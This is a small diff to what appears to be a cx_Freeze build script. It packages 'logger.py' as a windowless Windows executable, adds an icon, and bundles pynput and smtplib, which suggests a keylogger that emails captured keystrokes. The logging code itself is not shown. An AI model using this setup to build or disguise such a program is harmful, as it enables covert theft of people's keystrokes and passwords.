@@ -7,8 +7,8 @@ if (sys.platform == "win32"):
 
     base = "Win32GUI"
 
-    
-executables = [Executable("logger.py", base=base)]
+
+executables = [Executable("logger.py", base=base, icon="icon.ico")]
 
 packages = ["idna", "pynput", "threading", "smtplib", "time"]
 options = {
